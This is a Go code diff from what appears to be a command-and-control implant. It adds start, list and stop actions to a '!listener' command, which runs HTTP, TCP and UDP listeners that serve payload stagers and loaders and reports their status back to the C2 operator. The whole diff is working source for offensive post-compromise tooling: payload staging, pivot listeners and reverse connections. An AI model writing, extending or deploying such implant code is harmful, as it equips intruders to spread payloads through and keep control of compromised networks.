@@ -33,6 +33,16 @@ import (
 // Key: target addr string, Value: context.CancelFunc
 var ReverseConns sync.Map
 
+type listenerMeta struct {
+	Type      string
+	Port      string
+	Stager    string
+	Loader    string
+	StartedAt time.Time
+}
+
+var ActiveListeners sync.Map // map[string]listenerMeta, key: type:port
+
 // runListDir implements !ls --path <path>
 func runListDir(cmd *cobra.Command, args []string) {
 	path, _ := cmd.Flags().GetString("path")
@@ -279,16 +289,152 @@ func decodeInvocation(b64 string) (def.ResolvedInvocation, error) {
 
 // runListener implements !listener --type <http/tcp/udp> --port <port> --stager <path> --key <key> [--loader <path>]
 func runListener(cmd *cobra.Command, args []string) {
+	action, _ := cmd.Flags().GetString("action")
 	listenerType, _ := cmd.Flags().GetString("type")
 	port, _ := cmd.Flags().GetString("port")
 	stagerPath, _ := cmd.Flags().GetString("stager")
 	keyStr, _ := cmd.Flags().GetString("key")
 	loaderPath, _ := cmd.Flags().GetString("loader")
 
+	action = strings.ToLower(strings.TrimSpace(action))
+	listenerType = strings.ToLower(strings.TrimSpace(listenerType))
+
+	switch action {
+	case "list":
+		entries := []string{}
+		httpSeen := false
+		ActiveListeners.Range(func(key, value any) bool {
+			meta, ok := value.(listenerMeta)
+			if !ok {
+				return true
+			}
+			if meta.Type == "http" {
+				httpSeen = true
+			}
+			entries = append(entries, fmt.Sprintf("%s:%s stager=%s loader=%s started=%s",
+				meta.Type, meta.Port, meta.Stager, meta.Loader, meta.StartedAt.Format(time.RFC3339)))
+			return true
+		})
+		if !httpSeen {
+			if httpPort, ok := listener.HTTPListenerPort(); ok {
+				entries = append(entries, fmt.Sprintf("http:%s stager=%s loader=%s started=%s", httpPort, "unknown", "unknown", "unknown"))
+			}
+		}
+		if len(entries) == 0 {
+			c2transport.NotifyC2(cmd, "No active listeners\n")
+			return
+		}
+		sort.Strings(entries)
+		c2transport.NotifyC2(cmd, "%s\n", strings.Join(entries, "\n"))
+		return
+	case "stop":
+		stopOne := func(t, p string) error {
+			switch t {
+			case "http":
+				listener.StopHTTP()
+				ActiveListeners.Delete("http:" + p)
+				return nil
+			case "tcp":
+				err := listener.StopTCPListener(p)
+				ActiveListeners.Delete("tcp:" + p)
+				return err
+			case "udp":
+				err := listener.StopUDPListener(p)
+				ActiveListeners.Delete("udp:" + p)
+				return err
+			default:
+				return fmt.Errorf("unsupported listener type %s", t)
+			}
+		}
+
+		stopped := 0
+		errs := []string{}
+
+		if listenerType != "" && listenerType != "http" && listenerType != "tcp" && listenerType != "udp" {
+			c2transport.NotifyC2(cmd, "Error: unknown listener type '%s' (supported: http, tcp, udp)\n", listenerType)
+			return
+		}
+
+		stoppedHTTP := false
+		if listenerType != "" && port != "" {
+			if err := stopOne(listenerType, port); err != nil {
+				errs = append(errs, err.Error())
+			} else {
+				if listenerType == "http" {
+					stoppedHTTP = true
+				}
+				stopped++
+			}
+		} else {
+			keys := []string{}
+			ActiveListeners.Range(func(key, value any) bool {
+				k, ok := key.(string)
+				if ok {
+					keys = append(keys, k)
+				}
+				return true
+			})
+			for _, k := range keys {
+				parts := strings.SplitN(k, ":", 2)
+				if len(parts) != 2 {
+					continue
+				}
+				t, p := parts[0], parts[1]
+				if listenerType != "" && t != listenerType {
+					continue
+				}
+				if err := stopOne(t, p); err != nil {
+					errs = append(errs, err.Error())
+					continue
+				}
+				if t == "http" {
+					stoppedHTTP = true
+				}
+				stopped++
+			}
+		}
+
+		if !stoppedHTTP && (listenerType == "" || listenerType == "http") {
+			if _, ok := listener.HTTPListenerPort(); ok {
+				listener.StopHTTP()
+				stopped++
+			}
+		}
+
+		if stopped == 0 && len(errs) == 0 {
+			c2transport.NotifyC2(cmd, "No listeners matched stop criteria\n")
+			return
+		}
+		msg := fmt.Sprintf("Stopped %d listener(s)", stopped)
+		if len(errs) > 0 {
+			msg += "\nErrors:\n" + strings.Join(errs, "\n")
+		}
+		c2transport.NotifyC2(cmd, "%s\n", msg)
+		return
+	case "start":
+		// continue below
+	default:
+		c2transport.NotifyC2(cmd, "Error: unknown action '%s' (supported: start, list, stop)\n", action)
+		return
+	}
+
 	if stagerPath == "" {
 		c2transport.NotifyC2(cmd, "Error: stager not specified\n")
 		return
 	}
+	if port == "" {
+		c2transport.NotifyC2(cmd, "Error: port not specified\n")
+		return
+	}
+	if listenerType != "http" && listenerType != "tcp" && listenerType != "udp" {
+		c2transport.NotifyC2(cmd, "Error: unknown listener type '%s' (supported: http, tcp, udp)\n", listenerType)
+		return
+	}
+
+	listener.SetNotifyCallback(func(msg string) {
+		logging.Infof("%s", msg)
+		c2transport.NotifyC2(cmd, "[listener] %s\n", msg)
+	})
 
 	logging.Infof("Got listener request: %v", args)
 	errChan := make(chan error)
@@ -333,9 +479,23 @@ func runListener(cmd *cobra.Command, args []string) {
 		if err != nil {
 			c2transport.NotifyC2(cmd, "Error: %v\n", err)
 		} else {
+			ActiveListeners.Store(listenerType+":"+port, listenerMeta{
+				Type:      listenerType,
+				Port:      port,
+				Stager:    stagerPath,
+				Loader:    loaderPath,
+				StartedAt: time.Now(),
+			})
 			c2transport.NotifyC2(cmd, "Listener started successfully\n")
 		}
 	case <-time.After(3 * time.Second):
+		ActiveListeners.Store(listenerType+":"+port, listenerMeta{
+			Type:      listenerType,
+			Port:      port,
+			Stager:    stagerPath,
+			Loader:    loaderPath,
+			StartedAt: time.Now(),
+		})
 		c2transport.NotifyC2(cmd, "Listener started successfully\n")
 	}
 }
